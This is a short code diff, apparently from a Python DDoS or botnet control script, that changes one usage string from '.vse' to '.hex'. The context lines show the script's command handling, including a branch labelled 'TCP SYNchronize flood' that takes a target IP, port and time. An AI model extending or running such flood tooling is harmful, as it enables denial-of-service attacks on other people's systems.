@@ -154,7 +154,7 @@ def command_line(client):
                     else:
                         send(client, Fore.RED + 'Invalid IP-address')
                 else:
-                    send(client, 'Usage: .vse [IP] [PORT] [TIME]')
+                    send(client, 'Usage: .hex [IP] [PORT] [TIME]')
 
             # TCP SYNchronize flood           
             elif command == '.SYN':
